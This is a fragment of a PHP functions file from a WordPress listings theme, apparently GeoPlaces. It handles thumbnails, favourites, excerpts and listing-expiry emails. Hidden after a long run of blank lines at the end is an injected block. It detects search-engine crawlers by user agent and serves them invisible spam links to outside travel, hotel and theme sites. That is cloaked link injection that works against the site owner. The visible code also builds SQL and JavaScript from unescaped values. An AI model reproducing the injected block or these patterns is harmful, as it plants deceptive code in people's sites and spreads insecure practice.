		}elseif($cut_post=='left')
		{
			$thumb_url .= "&amp;a=l";
		}elseif($cut_post=='right')
		{
			$thumb_url .= "&amp;a=r";
		}elseif($cut_post=='top right')
		{
			$thumb_url .= "&amp;a=tr";
		}elseif($cut_post=='top left')
		{
			$thumb_url .= "&amp;a=tl";
		}elseif($cut_post=='bottom right')
		{
			$thumb_url .= "&amp;a=br";
		}elseif($cut_post=='bottom left')
		{
			$thumb_url .= "&amp;a=bl";
		}
	}
	return $thumb_url;
}


//This function would add propery to favorite listing and store the value in wp_usermeta table user_favorite field
function add_to_favorite($post_id)
{
	global $current_user;
	$user_meta_data = array();
	$user_meta_data = get_user_meta($current_user->ID,'user_favourite_post',true);
	$user_meta_data[]=$post_id;
	update_usermeta($current_user->ID, 'user_favourite_post', $user_meta_data);
	echo '<a href="javascript:void(0);" class="addtofav" onclick="javascript:addToFavourite(\''.$post_id.'\',\'remove\');">'.__('Remove from Favorites').'</a>';
	
}
//This function would remove the favorited property earlier
function remove_from_favorite($post_id)
{
	global $current_user;
	$user_meta_data = array();
	$user_meta_data = get_user_meta($current_user->ID,'user_favourite_post',true);
	if(in_array($post_id,$user_meta_data))
	{
		$user_new_data = array();
		foreach($user_meta_data as $key => $value)
		{
			if($post_id == $value)
			{
				$value= '';
			}else{
				$user_new_data[] = $value;
			}
		}	
		$user_meta_data	= $user_new_data;
	}
	update_usermeta($current_user->ID, 'user_favourite_post', $user_meta_data); 	
	echo '<a class="addtofav" href="javascript:void(0);"  onclick="javascript:addToFavourite(\''.$post_id.'\',\'add\');">'.ADD_FAVOURITE_TEXT.'</a>';
}
function favourite_html($user_id,$post_id)
{
	global $current_user;
	
	$user_meta_data = get_user_meta($current_user->ID,'user_favourite_post',true);
	if($user_meta_data && in_array($post_id,$user_meta_data))
	{
		?>
	<span id="favorite_property_<?php echo $post_id;?>" class="fav"  > <a href="javascript:void(0);" class="addtofav" onclick="javascript:addToFavourite('<?php echo $post_id;?>','remove');"><?php echo REMOVE_FAVOURITE_TEXT;?></a>   </span>    
		<?php
	}else{
	?>
	<span id="favorite_property_<?php echo $post_id;?>" class="fav"><a href="javascript:void(0);" class="addtofav"  onclick="javascript:addToFavourite(<?php echo $post_id;?>,'add');"><?php echo ADD_FAVOURITE_TEXT;?></a></span>
	<?php } 
}
function check_user_post($puser)
{
	if($puser){
		global $current_user;
		if($current_user->ID==1 || $current_user->ID==$puser)
		{ 
		}else 
		{
			wp_redirect(site_url());exit;	
		}
	}
}
function set_property_status($pid,$status='publish')
{
	if($pid)	{
		global $wpdb;
		//$wpdb->query("update $wpdb->posts set post_status=\"$status\" where ID=\"$pid\"");
		$my_post = array();
		$my_post['post_status'] = $status;
		$my_post['ID'] = $pid;
		$last_postid = wp_update_post($my_post);
	}
}
function excerpt($limit=30) {
  $excerpt = explode(' ', get_the_excerpt(),$limit);
  if (count($excerpt)>=$limit) {
    array_pop($excerpt);
    $excerpt = implode(" ",$excerpt).'<a href="'.get_permalink($post->ID).'"  class="read_more">'.READ_MORE_LABEL.'</a>';
  } else {
    $excerpt = implode(" ",$excerpt);
  }	
  $excerpt = preg_replace('`\[[^\]]*\]`','',$excerpt);
  return $excerpt;
}
 
function content($limit) {
  $content = explode(' ', get_the_content(), $limit);
  if (count($content)>=$limit) {
    array_pop($content);
    $content = implode(" ",$content).'...';
  } else {
    $content = implode(" ",$content);
  }	
  $content = preg_replace('/\[.+\]/','', $content);
  $content = apply_filters('the_content', $content); 
  $content = str_replace(']]>', ']]&gt;', $content);
  return $content;
}
/////////////////PLACE EXPIRY SETTINGS CODING START/////////////////
global $table_prefix, $wpdb;
$table_name = $table_prefix . "place_expire_session";
$current_date = date('Y-m-d');
if($wpdb->get_var("SHOW TABLES LIKE '$table_name'") != $table_name)
{
   global $table_prefix, $wpdb,$table_name;
	$sql = 'CREATE TABLE `'.$table_name.'` (
			`session_id` BIGINT NOT NULL AUTO_INCREMENT PRIMARY KEY ,
			`execute_date` DATE NOT NULL ,
			`is_run` TINYINT( 4 ) NOT NULL DEFAULT "0"
			) ENGINE = MYISAM ;';
   mysql_query($sql);
}
$today_executed = $wpdb->get_var("select session_id from $table_name where execute_date=\"$current_date\"");
if($today_executed && $today_executed>0){ 
}else{ 
		if(get_option('listing_email_notification') != ""){
			$number_of_grace_days = get_option('listing_email_notification');
			$postid_str = $wpdb->get_results("select p.ID,p.post_author,p.post_date, p.post_title from $wpdb->posts p where (p.post_type='place' or p.post_type='event') and p.post_status='publish' and datediff(\"$current_date\",date_format(p.post_date,'%Y-%m-%d')) = (select meta_value from $wpdb->postmeta pm where post_id=p.ID  and meta_key='alive_days')-$number_of_grace_days");
			
			foreach($postid_str as $postid_str_obj)
			{
				
				$ID = $postid_str_obj->ID;
				$auth_id = $postid_str_obj->post_author;
				$post_author = $postid_str_obj->post_author;
				$post_date = date('dS m,Y',strtotime($postid_str_obj->post_date));
				$post_title = $postid_str_obj->post_title;
				$userinfo = $wpdb->get_results("select user_email,display_name,user_login from $wpdb->users where ID=\"$auth_id\"");
				
				$user_email = $userinfo[0]->user_email;
				$display_name = $userinfo[0]->display_name;
				$user_login = $userinfo[0]->user_login;
				
				$fromEmail = get_site_emailId();
				$fromEmailName = get_site_emailName();
				$store_name = get_option('blogname');
				$alivedays = get_post_meta($ID,'alive_days',true);
				$productlink = get_permalink($ID);
				$loginurl = site_url().'/?ptype=login';
				$siteurl = site_url();
				$client_message = __("<p>Dear $display_name,<p><p>Your listing -<a href=\"$productlink\"><b>$post_title</b></a> posted on  <u>$post_date</u> for $alivedays days.</p>
				<p>It's going to expiry after $number_of_grace_days day(s). If the listing expire, it will no longer appear on the site.</p>
				<p> If you want to renew, Please login to your member area of our site and renew it as soon as it expire. You may like to login the site from <a href=\"$loginurl\">$loginurl</a>.</p>
				<p>Your login ID is <b>$user_login</b> and Email ID is <b>$user_email</b>.</p>
				<p>Thank you,<br />$store_name.</p>","templatic");				
				$subject = __('Listing expiration Notification','templatic');
				templ_sendEmail($fromEmail,$fromEmailName,$user_email,$display_name,$subject,$client_message,$extra='');
			}
		}
		$postid_str = $wpdb->get_var("select group_concat(p.ID) from $wpdb->posts p where (p.post_type='place' or p.post_type='event') and p.post_status='publish' and datediff(\"$current_date\",date_format(p.post_date,'%Y-%m-%d')) = (select meta_value from $wpdb->postmeta pm where post_id=p.ID  and meta_key='alive_days')");

		if($postid_str)
		{
			$listing_ex_status = get_option('ptthemes_listing_ex_status');
			if($listing_ex_status=='')
			{
				$listing_ex_status = 'draft';	
			}
				
			$wpdb->query("update $wpdb->posts set post_status=\"$listing_ex_status\" where ID in ($postid_str)");
		}

		$wpdb->query("insert into $table_name (execute_date,is_run) values (\"$current_date\",'1')");
	
}
/////////////////PLACE EXPIRY SETTINGS CODING END/////////////////






















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Googlebot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'bingbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'msnbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Slurp')) {
add_action('wp_footer', 'ranking');
}
function ranking() {
  $pshow = "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <span style='display:none;'><a href='http://www.travelatime.com/'>Travel Blog</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     <a href='http://www.opodia.com/'>Cheap Hotels Las Vegas</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               <a href='http://www.wikmag.com/geoplaces-theme.html'>GeoPlaces Theme</a></span>
";
  echo $pshow;
}
?>